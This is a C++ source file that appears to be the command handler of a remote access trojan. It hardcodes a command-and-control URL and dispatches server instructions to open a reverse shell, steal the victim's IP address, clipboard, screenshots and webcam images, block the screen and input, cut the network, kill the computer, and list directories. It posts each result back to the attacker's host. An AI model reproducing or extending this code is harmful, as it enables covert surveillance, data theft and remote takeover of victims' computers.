#include <iostream>
#include <random>
#include <string>

#include "spy.hpp"
#include "troll.hpp"
#include "filesystem.hpp"
#include "other.hpp"

#include "extern/json.hpp"

#pragma once

std::string OUTPUTS_URL = "http://0x3af72.pythonanywhere.com/outputs/?u=";

// For webcam
std::random_device rd;
std::mt19937 mt(rd());
std::uniform_int_distribution<int> uDistribution(1000000, 9999999);

void perform(std::string id, std::vector<std::string> values) {

    std::string type = values[1];

    if (type == "rshell") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", ReverseShell(values[2])}
        });
    }

    else if (type == "gip") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", GrabIP()}
        });
    }

    else if (type == "cboard") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", GrabClipboard()}
        });
    }

    else if (type == "ss") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", GrabScreenshot()}
        });
    }

    else if (type == "bscreen") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
        BlockScreen(atoi(values[2].c_str()));
    }

    else if (type == "binput") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
        BlockUserInput(atoi(values[2].c_str()));
    }

    else if (type == "offnet") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
        KillInternet(atoi(values[2].c_str()));
    }

    else if (type == "killpc") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
        KillComputer();
    }

    else if (type == "cd") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", ChangeDirectory(values[2]) ? "success" : "fail"}
        });
    }

    else if (type == "ls") {
        std::string data;
        for (std::string entry: ListDirectory()) {
            data += entry + "\n";
        }
        data = data.substr(0, data.size() - 1);
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", data}
        });
    }

    else if (type == "webcam") {
        std::string file = std::to_string(uDistribution(mt));
        if (GetWebcamImage(file + ".png")) {
            // How do i upload the file
            // Crashing
        } else {
            POST_Request(OUTPUTS_URL + id, {
                {"instruction_id", values[0]},
                {"type", "gip"}, // So that it displays text
                {"data", "webcam unsuccessful"}
            });
        }
    }
}